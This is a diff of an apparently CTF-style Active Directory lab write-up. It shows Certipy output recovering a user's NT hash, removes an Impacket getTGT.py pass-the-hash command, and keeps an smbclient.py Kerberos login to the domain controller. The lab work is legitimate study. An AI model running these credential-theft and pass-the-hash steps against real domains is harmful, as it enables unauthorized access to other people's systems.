@@ -246,8 +246,6 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'wombleycube'
 [*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
 
-alabaster@ssh-server-vm:~/impacket$ ./getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 northpole.local/wombleycube
-
 alabaster@ssh-server-vm:~/impacket$ ./smbclient.py -k -dc-ip 10.0.0.53 -target-ip 10.0.0.53 northpole.local/wombleycube@npdc01
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -287,6 +285,7 @@ And he'll silently take his way.
 
 **Achievement: AD**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE0MjMwNzQ0MywtMjAwMDI3ODY3OCwxMT
-Y0MzMzMTcwLDEwODc4NTMxNDcsLTIwMTAxOTI2M119
+eyJoaXN0b3J5IjpbMTE1NDAwNzk1MiwtMTQyMzA3NDQzLC0yMD
+AwMjc4Njc4LDExNjQzMzMxNzAsMTA4Nzg1MzE0NywtMjAxMDE5
+MjYzXX0=
 -->
